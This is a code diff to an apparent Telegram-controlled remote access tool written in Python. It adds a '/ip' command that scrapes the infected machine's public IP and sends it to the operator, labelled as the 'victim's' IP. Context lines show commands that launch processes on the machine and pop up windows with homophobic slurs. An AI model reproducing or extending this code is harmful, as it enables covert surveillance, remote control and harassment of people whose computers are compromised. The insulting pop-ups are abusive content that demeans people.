@@ -1,5 +1,6 @@
-import random,telebot,os,webbrowser,pyautogui,time
+import random,telebot,os,webbrowser,pyautogui,time,requests,re
 from PIL import Image, ImageGrab
+from bs4 import BeautifulSoup
 
 
 
@@ -39,7 +40,19 @@ def commands(message):
         elif message.text == '/process':
                 bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)')
                 bot.register_next_step_handler(message,get_process)
-                
+        
+        
+        elif message.text == '/ip':
+                url = 'https://yandex.ru/internet/'
+                page = requests.get(url)
+                soup = BeautifulSoup(page.text, "html.parser")
+                ip = soup.findAll('ul', class_='general-info layout__general-info')
+                ip = str(ip)
+                ip = re.sub('<[^>]*>', '\n', ip)
+                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip))
+        
+        
+        
         elif message.text == '/window':
                 pyautogui.alert("Ты пидор", "Тест", button="да")
                 pyautogui.alert("Ты гей", "Тест", button="да")
